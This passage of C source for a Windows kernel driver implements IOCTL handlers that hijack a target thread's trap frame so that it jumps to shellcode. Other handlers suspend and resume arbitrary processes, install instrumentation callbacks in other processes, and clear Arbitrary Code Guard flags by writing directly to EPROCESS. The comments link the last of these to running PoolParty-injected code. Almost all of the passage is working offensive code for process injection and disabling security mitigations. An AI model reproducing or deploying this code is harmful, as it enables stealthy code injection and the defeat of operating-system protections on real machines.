        *(ULONGLONG*)((PUCHAR)trapFrame + 0x38)  = paramsAddr;
        verifyRip = *(ULONGLONG*)((PUCHAR)trapFrame + 0x168);
        verifyRcx = *(ULONGLONG*)((PUCHAR)trapFrame + 0x38);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = STATUS_ACCESS_VIOLATION;
    }
    KeLowerIrql(hijackIrql);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] HIJACK: TrapFrame write failed (offset wrong?)\n");
        goto bail;
    }

    DbgPrint("[CatDriver] HIJACK: TrapFrame Rip: 0x%llX -> 0x%llX  Rcx -> 0x%llX\n",
             origRip, shellcodeAddr, paramsAddr);
    DbgPrint("[CatDriver] HIJACK: Readback Rip=0x%llX Rcx=0x%llX %s\n",
             verifyRip, verifyRcx,
             (verifyRip == shellcodeAddr && verifyRcx == paramsAddr) ? "OK" : "REVERTED!");

    /* Wake the thread from its wait so our new context takes effect now. */
    if (pfnKeAlertThread) {
        NTSTATUS alertSt = pfnKeAlertThread((PKTHREAD)thread, UserMode);
        DbgPrint("[CatDriver] HIJACK: KeAlertThread -> 0x%08X\n", alertSt);
    }

bail:
    if (process) ObDereferenceObject(process);
    if (thread)  ObDereferenceObject(thread);
    response->Success     = NT_SUCCESS(status) ? 1 : 0;
    response->NtStatus    = status;
    response->OriginalRip = NT_SUCCESS(status) ? origRip : 0;
    Irp->IoStatus.Information = CAT_HIJACK_OUTPUT_SIZE;
    return STATUS_SUCCESS;
}

/* ================================================================
 * CatFreezeProcess / CatThawProcess — caller-controlled freeze window
 * ================================================================ */

typedef NTSTATUS (NTAPI *PFN_PsSuspendProcess2)(PEPROCESS Process);
typedef NTSTATUS (NTAPI *PFN_PsResumeProcess2)(PEPROCESS Process);
static PFN_PsSuspendProcess2 g_pfnPsSuspendProcess = NULL;
static PFN_PsResumeProcess2  g_pfnPsResumeProcess  = NULL;

static void ResolveFreezeFunctions(void) {
    if (g_pfnPsSuspendProcess) return;
    UNICODE_STRING n;
    RtlInitUnicodeString(&n, L"PsSuspendProcess");
    g_pfnPsSuspendProcess = (PFN_PsSuspendProcess2)MmGetSystemRoutineAddress(&n);
    RtlInitUnicodeString(&n, L"PsResumeProcess");
    g_pfnPsResumeProcess = (PFN_PsResumeProcess2)MmGetSystemRoutineAddress(&n);
    DbgPrint("[CatDriver] FREEZE: PsSuspendProcess=0x%p PsResumeProcess=0x%p\n",
             g_pfnPsSuspendProcess, g_pfnPsResumeProcess);
}

static NTSTATUS CatFreezeProcess(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_FREEZE_REQUEST  req;
    PCAT_FREEZE_RESPONSE resp;
    PEPROCESS            process = NULL;
    NTSTATUS             status;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < sizeof(CAT_FREEZE_REQUEST) ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < sizeof(CAT_FREEZE_RESPONSE)) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    req  = (PCAT_FREEZE_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    resp = (PCAT_FREEZE_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    ResolveFreezeFunctions();
    if (!g_pfnPsSuspendProcess) {
        resp->Success = 0;
        resp->NtStatus = (LONG)STATUS_NOT_FOUND;
        Irp->IoStatus.Information = sizeof(CAT_FREEZE_RESPONSE);
        return STATUS_SUCCESS;
    }

    status = CatLookupLiveProcess(req->ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        resp->Success = 0;
        resp->NtStatus = status;
        Irp->IoStatus.Information = sizeof(CAT_FREEZE_RESPONSE);
        return STATUS_SUCCESS;
    }

    NTSTATUS sst = g_pfnPsSuspendProcess(process);
    DbgPrint("[CatDriver] FREEZE: PsSuspendProcess(PID %u) -> 0x%08X\n",
             req->ProcessId, sst);

    ObDereferenceObject(process);

    resp->Success = NT_SUCCESS(sst) ? 1 : 0;
    resp->NtStatus = sst;
    Irp->IoStatus.Information = sizeof(CAT_FREEZE_RESPONSE);
    return STATUS_SUCCESS;
}

static NTSTATUS CatThawProcess(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_FREEZE_REQUEST  req;
    PCAT_FREEZE_RESPONSE resp;
    PEPROCESS            process = NULL;
    NTSTATUS             status;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < sizeof(CAT_FREEZE_REQUEST) ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < sizeof(CAT_FREEZE_RESPONSE)) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    req  = (PCAT_FREEZE_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    resp = (PCAT_FREEZE_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    ResolveFreezeFunctions();
    if (!g_pfnPsResumeProcess) {
        resp->Success = 0;
        resp->NtStatus = (LONG)STATUS_NOT_FOUND;
        Irp->IoStatus.Information = sizeof(CAT_FREEZE_RESPONSE);
        return STATUS_SUCCESS;
    }

    status = CatLookupLiveProcess(req->ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        resp->Success = 0;
        resp->NtStatus = status;
        Irp->IoStatus.Information = sizeof(CAT_FREEZE_RESPONSE);
        return STATUS_SUCCESS;
    }

    NTSTATUS rst = g_pfnPsResumeProcess(process);
    DbgPrint("[CatDriver] THAW: PsResumeProcess(PID %u) -> 0x%08X\n",
             req->ProcessId, rst);

    ObDereferenceObject(process);

    resp->Success = NT_SUCCESS(rst) ? 1 : 0;
    resp->NtStatus = rst;
    Irp->IoStatus.Information = sizeof(CAT_FREEZE_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * CatSetInstrumentation — set process instrumentation callback via
 * ZwSetInformationProcess(ProcessInstrumentationCallback). Fires on
 * every syscall return in the target process, bypassing APC delivery.
 *
 * The former EPROCESS+0x480 direct-write fallback has been removed:
 * on recent builds PatchGuard sweeps this field (bugcheck 0x109
 * subcode 0x3F) and the offset is build-specific anyway. If the Zw
 * path fails, that failure is returned to the client — we don't
 * paper over configuration gaps with memory corruption.
 * ================================================================ */
static NTSTATUS CatSetInstrumentation(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_INSTRUMENT_REQUEST  req;
    PCAT_INSTRUMENT_RESPONSE resp;
    PEPROCESS                process = NULL;
    NTSTATUS                 status;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < sizeof(CAT_INSTRUMENT_REQUEST) ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < sizeof(CAT_INSTRUMENT_RESPONSE)) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    req  = (PCAT_INSTRUMENT_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    resp = (PCAT_INSTRUMENT_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    /* CallbackAddr == 0 means "clear"; any non-zero value must be a legal
     * user VA — otherwise next syscall return in the target thread sets
     * RIP to a kernel/garbage address and bugchecks 0x3B/0x1E in the
     * syscall path. */
    ULONG64 cbAddr = req->CallbackAddr;
    if (cbAddr != 0 && !CatIsValidUserVa(cbAddr, 1)) {
        DbgPrint("[CatDriver] INSTRUMENT: rejected bogus CallbackAddr 0x%llX\n", cbAddr);
        resp->Success  = 0;
        resp->NtStatus = (LONG)STATUS_INVALID_PARAMETER;
        Irp->IoStatus.Information = sizeof(CAT_INSTRUMENT_RESPONSE);
        return STATUS_INVALID_PARAMETER;
    }

    status = CatLookupLiveProcess(req->ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] INSTRUMENT: CatLookupLiveProcess failed 0x%08X\n", status);
        resp->Success = 0;
        resp->NtStatus = status;
        Irp->IoStatus.Information = sizeof(CAT_INSTRUMENT_RESPONSE);
        return STATUS_SUCCESS;
    }

    /* ONLY ZwSetInformationProcess — the previous EPROCESS+0x480 fallback
     * was a bugcheck factory: direct writes to EPROCESS mitigation /
     * instrumentation fields trip PatchGuard (0x109 subcode 0x3F on recent
     * builds), and the offset is build-specific — any mismatch corrupts an
     * unrelated field. If the Zw path fails on a given build, that's a
     * configuration problem we return cleanly, not something to paper over
     * with memory corruption. */
    HANDLE hProcess = NULL;
    status = ObOpenObjectByPointer(
        process,
        OBJ_KERNEL_HANDLE,
        NULL,
        CAT_PROCESS_SET_INFORMATION,
        *PsProcessType,
        KernelMode,
        &hProcess
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] INSTRUMENT: ObOpenObjectByPointer failed 0x%08X\n", status);
        ObDereferenceObject(process);
        resp->Success = 0;
        resp->NtStatus = status;
        Irp->IoStatus.Information = sizeof(CAT_INSTRUMENT_RESPONSE);
        return STATUS_SUCCESS;
    }

    struct {
        ULONG Version;
        ULONG Reserved;
        PVOID Callback;
    } cbInfo;
    cbInfo.Version  = 0;
    cbInfo.Reserved = 0;
    cbInfo.Callback = (PVOID)(ULONG_PTR)cbAddr;

    status = ZwSetInformationProcess(
        hProcess,
        CatProcessInstrumentationCallback,
        &cbInfo,
        sizeof(cbInfo)
    );
    ZwClose(hProcess);

    DbgPrint("[CatDriver] INSTRUMENT: ZwSetInformationProcess -> 0x%08X  cb=0x%llX\n",
             status, cbAddr);

    ObDereferenceObject(process);
    resp->Success  = NT_SUCCESS(status) ? 1 : 0;
    resp->NtStatus = status;
    Irp->IoStatus.Information = sizeof(CAT_INSTRUMENT_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * CatClearAcg — disable ACG (Arbitrary Code Guard) on target
 * process by clearing EPROCESS mitigation flags.
 *
 * Win11 24H2 (build 26100) EPROCESS offsets (Vergilius Project):
 *   +0x1F4  Flags (ULONG union)
 *             bit  4 = ManageExecutableMemoryWrites
 *   +0x750  MitigationFlags (ULONG union)
 *             bit  8 = DisableDynamicCode
 *             bit  9 = DisableDynamicCodeAllowOptOut
 *             bit 10 = DisableDynamicCodeAllowRemoteDowngrade
 *             bit 11 = AuditDisableDynamicCode
 *
 * After this call, user-mode code in the target process can execute
 * from VirtualAlloc'd regions (e.g. PoolParty-mapped DLL text).
 * ================================================================ */
#define EPROCESS_OFF_FLAGS_WIN11_24H2            0x1F4
#define EPROCESS_OFF_MITIGATION_FLAGS_WIN11_24H2 0x750

#define FLAGS_MANAGE_EXECUTABLE_MEMORY_WRITES    (1u << 4)
#define MITIGATION_DISABLE_DYNAMIC_CODE_MASK     ((1u << 8) | (1u << 9) | (1u << 10) | (1u << 11))

static NTSTATUS CatClearAcg(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    NTSTATUS           status;
    PCAT_ACG_REQUEST   request;
    PCAT_ACG_RESPONSE  response;
    PEPROCESS          process = NULL;
    volatile ULONG*    flagsPtr;
    volatile ULONG*    mitPtr;
    ULONG              oldFlags, oldMit, newFlags, newMit;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < sizeof(CAT_ACG_REQUEST)) {
        return STATUS_BUFFER_TOO_SMALL;
    }
    if (IoStack->Parameters.DeviceIoControl.OutputBufferLength < sizeof(CAT_ACG_RESPONSE)) {
        return STATUS_BUFFER_TOO_SMALL;
    }

    request  = (PCAT_ACG_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_ACG_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    if (request->ProcessId == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    /* R0 row #10: build-aware gate. EPROCESS Flags/MitigationFlags offsets
     * are build-specific. The pinned values below are verified on Win11
     * 26100 (24H2) and empirically work on 26200 (25H2). Any other build
     * — including 0, meaning RtlGetVersion never ran or failed — refuse.
     * Previously the `!= 0 &&` short-circuit let an undiscovered build
     * bypass the gate and clobber random EPROCESS fields. */
    if (g_OsBuildNumber != 26100 && g_OsBuildNumber != 26200) {
        DbgPrint("[CatDriver] CLEAR_ACG: OS build %u not in known-good set {26100, 26200} — refuse\n",
                 g_OsBuildNumber);
        response->OldFlags = 0;
        response->OldMitigationFlags = 0;
        response->NewFlags = 0;
        response->NewMitigationFlags = 0;
        response->NtStatus = STATUS_NOT_SUPPORTED;
        Irp->IoStatus.Information = sizeof(CAT_ACG_RESPONSE);
        return STATUS_NOT_SUPPORTED;
    }

    status = CatLookupLiveProcess(request->ProcessId, &process);
    if (!NT_SUCCESS(status) || !process) {
        DbgPrint("[CatDriver] CLEAR_ACG: CatLookupLiveProcess pid=%u status=0x%08X\n",
                 request->ProcessId, status);
        return status;
    }

    flagsPtr = (volatile ULONG*)((PUCHAR)process + EPROCESS_OFF_FLAGS_WIN11_24H2);
    mitPtr   = (volatile ULONG*)((PUCHAR)process + EPROCESS_OFF_MITIGATION_FLAGS_WIN11_24H2);

    /* Raise to DISPATCH across the read-modify-write pair so the kernel
     * scheduler can't interleave a mitigation-change path on another thread
     * of the target process on the same CPU while we're mid-update. The two
     * fields are not atomically paired by the kernel; this just narrows the
     * tear window. The real safety still comes from PatchGuard not having
     * sampled us at the moment of the write — this IOCTL is inherently a
     * 0x109 roulette and callers should treat it as such. */
    KIRQL oldIrql;
    KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);
    __try {
        oldFlags = *flagsPtr;
        oldMit   = *mitPtr;
        newFlags = oldFlags & ~FLAGS_MANAGE_EXECUTABLE_MEMORY_WRITES;
        newMit   = oldMit   & ~MITIGATION_DISABLE_DYNAMIC_CODE_MASK;
        *flagsPtr = newFlags;
        *mitPtr   = newMit;
        status = STATUS_SUCCESS;
        DbgPrint("[CatDriver] CLEAR_ACG pid=%u Flags: 0x%08X -> 0x%08X  Mit: 0x%08X -> 0x%08X\n",
                 request->ProcessId, oldFlags, newFlags, oldMit, newMit);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        oldFlags = oldMit = newFlags = newMit = 0;
        DbgPrint("[CatDriver] CLEAR_ACG EXCEPTION 0x%08X\n", status);
    }
    KeLowerIrql(oldIrql);

    ObDereferenceObject(process);

    response->OldFlags = oldFlags;
    response->OldMitigationFlags = oldMit;
    response->NewFlags = newFlags;
    response->NewMitigationFlags = newMit;
    response->NtStatus = status;
    Irp->IoStatus.Information = sizeof(CAT_ACG_RESPONSE);
    return STATUS_SUCCESS;
}
